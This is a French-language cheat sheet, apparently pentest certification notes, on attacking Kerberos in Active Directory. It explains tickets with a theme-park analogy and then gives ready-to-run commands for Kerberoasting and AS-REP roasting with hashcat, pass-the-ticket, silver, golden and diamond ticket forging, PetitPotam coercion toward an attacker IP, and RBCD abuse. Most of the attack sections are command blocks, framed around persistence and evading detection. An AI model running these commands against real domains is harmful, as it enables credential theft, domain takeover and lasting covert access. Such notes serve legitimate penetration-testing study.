# Protocole Kerberos

## L'analogie du parc d'attractions

Quand tu entres dans un parc (Disneyland par exemple) :

1. Tu te présentes à **l'accueil** avec ta carte d'identité
2. L'accueil te donne un **bracelet** (valable la journée)
3. À chaque attraction, tu montres juste ton bracelet → pas besoin de re-montrer ta carte d'identité

Kerberos fonctionne exactement comme ça :

```
1. Tu te connectes au DC avec ton mot de passe
   → Le DC te donne un TGT (bracelet)     ← "Tu es bien Alice"

2. Tu veux accéder à \\SERVEUR-FICHIERS
   → Tu montres ton TGT au DC
   → Le DC te donne un TGS (ticket pour cette attraction)

3. Tu présentes ton TGS à \\SERVEUR-FICHIERS
   → Accès accordé, sans que le serveur ait besoin de contacter le DC
```

---

## Les acteurs et objets Kerberos

| Terme | Analogie | Description |
|-------|---------|-------------|
| **KDC** (Key Distribution Center) | L'accueil du parc | Le DC : émet les tickets |
| **TGT** (Ticket Granting Ticket) | Le bracelet journée | Prouve ton identité auprès du KDC |
| **TGS** (Ticket Granting Service) | Le ticket attraction | Permet d'accéder à un service précis |
| **SPN** (Service Principal Name) | Le nom de l'attraction | Identifie un service : `MSSQLSvc/srv.dom:1433` |
| **KRBTGT** | Le maître des bracelets | Compte qui chiffre **tous** les TGT |
| **PAC** (Privilege Attribute Certificate) | Les infos sur le bracelet | Contenu dans les tickets : SID, groupes, droits |

---

## Pourquoi Kerberos est attaquable

Les tickets sont **chiffrés avec le hash du compte concerné** :

- TGT chiffré avec le hash de **KRBTGT**
- TGS chiffré avec le hash du **compte de service**

→ Si on peut récupérer un ticket et cracker le hash offline → **Kerberoasting**

→ Si on vole le hash du compte `KRBTGT` (le compte maître), on peut **forger des tickets illimités** → **Golden Ticket**

---

## Pré-authentification Kerberos

Par défaut, le client doit **prouver** qu'il connaît son mot de passe AVANT de recevoir un TGT.
Si cette option est désactivée sur un compte → n'importe qui peut demander un AS-REP pour ce compte **sans connaître son mot de passe** → **AS-REP Roasting**.

---

## 1. Kerberoasting

### Le concept

N'importe quel utilisateur du domaine peut demander un **TGS** pour n'importe quel compte de service (qui a un SPN). Ce ticket est **chiffré avec le hash du compte de service**. On peut le cracker offline.

```
1. On liste les comptes avec un SPN (Service Principal Name)
2. On demande leur ticket TGS
3. On extrait le hash chiffré du ticket
4. On crack offline avec hashcat
```

```bash
# Lister les SPNs et récupérer les hashes TGS
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP \
    -request -outputfile ~/certif/hashes/kerberoast.hash

# Via nxc
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --kerberoasting ~/certif/hashes/kerberoast.hash

# Crack (RC4 = mode 13100)
hashcat -m 13100 ~/certif/hashes/kerberoast.hash /usr/share/wordlists/rockyou.txt
```

!!! note "Condition"
    Ça marche uniquement si le compte de service a un **mot de passe faible**.
    Les comptes gérés automatiquement (**gMSA**) sont immunisés.

---

## 2. AS-REP Roasting

### Le concept

Normalement, Kerberos exige une **pré-authentification** : le client prouve qu'il connaît son mot de passe avant de recevoir un ticket. Mais si cette option est désactivée sur un compte, n'importe qui peut demander un ticket AS-REP pour ce compte, **sans mot de passe**.

```bash
# Trouver les comptes vulnérables et récupérer les hashes
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN --asreproast ~/certif/hashes/asrep.hash

# Sans compte valide (si le compte est connu)
GetNPUsers.py $DOMAIN_FQDN/ -usersfile users.txt -no-pass -dc-ip $DC_IP

# Crack (mode 18200)
hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## 3. Pass-the-Ticket (PtT)

Utiliser un ticket `.ccache` déjà obtenu pour s'authentifier.

```bash
# Obtenir un TGT
getTGT.py $DOMAIN_FQDN/$USER:$PWD
# OU avec hash NT
getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER

# Charger le ticket dans la session
export KRB5CCNAME=$PWD/$USER.ccache
klist

# Utiliser avec Impacket (-k -no-pass)
psexec.py  -k -no-pass $DOMAIN/$USER@$DC_FQDN
wmiexec.py -k -no-pass $DOMAIN/$USER@$DC_FQDN
nxc smb $DC_FQDN -u $USER --use-kcache -d $DOMAIN
```

---

## 4. Overpass-the-Hash (OPtH)

Convertir un NT hash en TGT Kerberos : contourne les filtres NTLM.

```bash
getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER
export KRB5CCNAME=$PWD/$USER.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET_FQDN
```

---

## 5. Pass-the-Key (clé AES)

Utiliser la clé AES du compte au lieu du hash NT.

```bash
# Dump des clés AES (Windows / Mimikatz)
# mimikatz # sekurlsa::ekeys

# Linux : utiliser la clé AES256
getTGT.py -aesKey <aes256_key_64hex> $DOMAIN_FQDN/$USER
```

---

## 6. Silver Ticket

Forger un **TGS** directement avec le hash du compte de service : sans passer par le DC.

```bash
# Prérequis : hash NT du compte de service + SID du domaine + SPN
ticketer.py -nthash $SVC_HASH \
            -domain-sid $DOMAIN_SID \
            -domain $DOMAIN_FQDN \
            -spn MSSQLSvc/sql01.entreprise.local:1433 \
            Administrator

export KRB5CCNAME=$PWD/Administrator.ccache
mssqlclient.py -k Administrator@sql01.entreprise.local
```

!!! tip "Avantage du Silver Ticket"
    Fonctionne même si KRBTGT est changé. Aucune interaction avec le DC lors de l'utilisation.

---

## 7. Golden Ticket

Forger un **TGT** avec le hash de **KRBTGT** : le Saint Graal. Accès illimité à tout le domaine.

```bash
# Prérequis : hash NT de KRBTGT + SID du domaine (obtenus via DCSync)
ticketer.py -nthash $KRBTGT_HASH \
            -domain-sid $DOMAIN_SID \
            -domain $DOMAIN_FQDN \
            Administrator

export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN
```

!!! danger "Persistance maximale"
    Même si tous les mots de passe sont changés après ton départ, ton Golden Ticket reste valide jusqu'à ce que le mot de passe de **KRBTGT soit changé deux fois**. Valide 10 ans par défaut.

---

## 8. Diamond Ticket (variante furtive)

Modifie le PAC d'un TGT **légitime** au lieu d'en forger un de zéro : moins détectable par les SIEM.

```bash
ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN_FQDN \
            -request -user $USER -password $PWD -dc-ip $DC_IP Administrator
```

---

## Délégations Kerberos

### Unconstrained Delegation
Un service peut s'authentifier auprès de **n'importe quel service** au nom d'un utilisateur.
Exploitation : forcer un DC à s'authentifier → capturer son TGT → DCSync.

```bash
findDelegation.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP | grep "Unconstrained"
# Forcer l'auth du DC (PetitPotam)
python3 PetitPotam.py -u $USER -p $PWD -d $DOMAIN $ATTACKER_IP $DC_IP
```

### Constrained Delegation (S4U)
Un service peut déléguer vers des **services spécifiques** (liste dans `msDS-AllowedToDelegateTo`).

```bash
getST.py -spn 'cifs/target.entreprise.local' \
         -impersonate Administrator \
         $DOMAIN/svc_delegate:$SVC_PWD

export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass target.entreprise.local
```

### RBCD (Resource-Based Constrained Delegation)
La **cible** contrôle elle-même qui peut déléguer vers elle : attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```bash
# 1. Créer un compte machine
addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' \
               -dc-ip $DC_IP $DOMAIN_FQDN/$USER:$PWD

# 2. Configurer RBCD sur la cible
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' \
        -dc-ip $DC_IP -action write $DOMAIN_FQDN/$USER:$PWD

# 3. S4U → obtenir un ticket Administrator
getST.py -spn 'cifs/target.entreprise.local' \
         -impersonate Administrator \
         $DOMAIN/EVIL\$:'EvilPass123!'

export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass target.entreprise.local
```

---

## Résumé des modes hashcat Kerberos

| Attaque | Mode hashcat | Format du hash |
|---------|-------------|----------------|
| AS-REP Roasting | `-m 18200` | `$krb5asrep$23$...` |
| Kerberoasting RC4 | `-m 13100` | `$krb5tgs$23$*...*` |
| Kerberoasting AES128 | `-m 19600` | `$krb5tgs$17$...` |
| Kerberoasting AES256 | `-m 19700` | `$krb5tgs$18$...` |

---

## Synchronisation horloge

Kerberos est très sensible à la synchronisation du temps (tolérance : 5 minutes).

```bash
# Erreur "Clock skew too great" → synchroniser sur le DC
sudo ntpdate $DC_IP
sudo rdate -n $DC_IP
```

---

## Récupérer le SID du domaine

Nécessaire pour forger des tickets (Golden/Silver/Diamond).

```bash
# Depuis la sortie secretsdump (ligne "Domain SID:")
grep "Domain SID" ~/certif/loot/ntds_dump.txt

# Via lookupsid
lookupsid.py $DOMAIN_FQDN/$USER:$PWD@$DC_IP 0 | head

# Via nxc
nxc smb $DC_IP -u $USER -p $PWD --rid-brute | head
```
